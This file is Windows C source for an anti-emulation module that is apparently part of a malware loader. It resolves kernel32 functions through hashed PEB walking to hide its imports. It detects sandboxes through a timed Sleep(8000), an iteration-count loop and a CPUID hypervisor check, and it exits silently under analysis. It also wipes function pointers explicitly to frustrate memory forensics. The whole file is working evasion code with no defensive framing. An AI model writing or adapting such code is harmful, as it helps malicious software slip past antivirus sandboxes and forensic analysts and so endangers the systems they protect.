#ifdef _WIN32

#include "anti_emu.h"
#include "peb_walk.h"
#include "hash.h"

#include <windows.h>
#include <stdint.h>
#include <cpuid.h>

typedef void    (WINAPI *pfn_Sleep)(DWORD);
typedef void    (WINAPI *pfn_ExitProcess)(UINT);
typedef BOOL    (WINAPI *pfn_QueryPerformanceCounter)(LARGE_INTEGER *);
typedef BOOL    (WINAPI *pfn_QueryPerformanceFrequency)(LARGE_INTEGER *);

/*
 * Volatile sinks. Iter counts and CPUID HV bit are XORed in so the
 * optimizer cannot prove the timed loop and CPUID read dead.
 */
static volatile uint64_t g_anti_emu_sink;

/*
 * Volatile pointer to a volatile char to defeat -Os dead-store
 * elimination on stack wipes.
 */
static void wipe_locals(volatile void *p, size_t n)
{
    volatile unsigned char *b = (volatile unsigned char *)p;
    for (size_t i = 0; i < n; i++) b[i] = 0;
}

/*
 * Sleep-skip floor. 40% of the requested 8000 ms — 4800 ms of headroom
 * over real-hardware scheduler jitter, which only makes Sleep return
 * later, never earlier.
 */
#define ANTI_EMU_SLEEP_REQ_MS    8000u
#define ANTI_EMU_SLEEP_FLOOR_MS  3200u

/*
 * Guard-2 wall-clock window and iteration floor. 1.5 s is enough for
 * any modern x86_64 to accumulate >100M iter; the 1M floor is 100x
 * conservative for older / throttled CPUs while still cleanly
 * separating real from iteration-bounded emulators.
 */
#define ANTI_EMU_LOOP_WIN_MS     1500u
#define ANTI_EMU_LOOP_FLOOR      1000000ull

void anti_emu_run(void)
{
    /* --- Local PEB resolution. Volatile to block constant-folding /
     *     reordering of the timing arithmetic that follows. */
    volatile pfn_Sleep                       p_Sleep   = 0;
    volatile pfn_ExitProcess                 p_Exit    = 0;
    volatile pfn_QueryPerformanceCounter     p_QPC     = 0;
    volatile pfn_QueryPerformanceFrequency   p_QPF     = 0;

    void *k32 = peb_find_module(H_KERNEL32_DLL);
    if (!k32) return; /* fail-open: caller will fail resolve_apis() */

    p_Sleep = (pfn_Sleep)peb_find_export(k32, H_SLEEP);
    p_Exit  = (pfn_ExitProcess)peb_find_export(k32, H_EXITPROCESS);
    p_QPC   = (pfn_QueryPerformanceCounter)peb_find_export(
                  k32, H_QUERYPERFORMANCECOUNTER);
    p_QPF   = (pfn_QueryPerformanceFrequency)peb_find_export(
                  k32, H_QUERYPERFORMANCEFREQUENCY);

    if (!p_Sleep || !p_Exit || !p_QPC || !p_QPF) return;

    /* --- Guard 1: QPC bracket around Sleep(8000). */
    LARGE_INTEGER freq = {0};
    LARGE_INTEGER t0   = {0};
    LARGE_INTEGER t1   = {0};
    LARGE_INTEGER t2   = {0};
    LARGE_INTEGER tnow = {0};

    if (!p_QPF(&freq) || freq.QuadPart == 0) goto bail;
    if (!p_QPC(&t0)) goto bail;

    p_Sleep(ANTI_EMU_SLEEP_REQ_MS);

    if (!p_QPC(&t1)) goto bail;

    /* elapsed_ms = (t1 - t0) * 1000 / freq.
     * 64-bit math; freq is typically 10_000_000 (10 MHz) on Win10/11. */
    uint64_t delta1 = (uint64_t)(t1.QuadPart - t0.QuadPart);
    uint64_t elapsed_ms = (delta1 * 1000ull) / (uint64_t)freq.QuadPart;

    if (elapsed_ms < (uint64_t)ANTI_EMU_SLEEP_FLOOR_MS) goto bail;

    /* --- Guard 2: bounded QPC loop with iter counter. */
    if (!p_QPC(&t2)) goto bail;

    volatile uint64_t iter = 0;
    for (;;) {
        if (!p_QPC(&tnow)) goto bail;
        uint64_t d = (uint64_t)(tnow.QuadPart - t2.QuadPart);
        uint64_t ms = (d * 1000ull) / (uint64_t)freq.QuadPart;
        if (ms >= (uint64_t)ANTI_EMU_LOOP_WIN_MS) break;
        iter++;
    }
    g_anti_emu_sink ^= iter;

    if (iter < ANTI_EMU_LOOP_FLOOR) goto bail;

    /* --- Guard 3: CPUID leaf 1, ECX bit 31. Informational; never
     *     gates execution. Sunk into the same volatile so the read
     *     cannot be elided. */
    {
        unsigned int a = 0, b = 0, c = 0, d = 0;
        __cpuid(1, a, b, c, d);
        g_anti_emu_sink ^= (uint64_t)(c & 0x80000000u);
        (void)a; (void)b; (void)d;
    }

    /* --- Pass. Wipe sensitive locals before returning. Function
     *     pointers are addresses into kernel32 — useful to a memory
     *     forensicator, so we zero them too. */
    wipe_locals(&freq,    sizeof(freq));
    wipe_locals(&t0,      sizeof(t0));
    wipe_locals(&t1,      sizeof(t1));
    wipe_locals(&t2,      sizeof(t2));
    wipe_locals(&tnow,    sizeof(tnow));
    wipe_locals((void *)&p_Sleep, sizeof(p_Sleep));
    wipe_locals((void *)&p_QPC,   sizeof(p_QPC));
    wipe_locals((void *)&p_QPF,   sizeof(p_QPF));
    /* Keep p_Exit live — it is scope-local and goes out of scope on
     * return; the compiler will reuse the register / stack slot. */
    (void)p_Exit;
    return;

bail:
    /* Wipe everything on the cold path, then exit. */
    {
        volatile pfn_ExitProcess exit_fn = p_Exit;
        wipe_locals(&freq,    sizeof(freq));
        wipe_locals(&t0,      sizeof(t0));
        wipe_locals(&t1,      sizeof(t1));
        wipe_locals(&t2,      sizeof(t2));
        wipe_locals(&tnow,    sizeof(tnow));
        wipe_locals((void *)&p_Sleep, sizeof(p_Sleep));
        wipe_locals((void *)&p_QPC,   sizeof(p_QPC));
        wipe_locals((void *)&p_QPF,   sizeof(p_QPF));
        wipe_locals((void *)&p_Exit,  sizeof(p_Exit));
        if (exit_fn) exit_fn(0);
        for (;;) { } /* unreachable when exit_fn resolved */
    }
}

#endif /* _WIN32 */
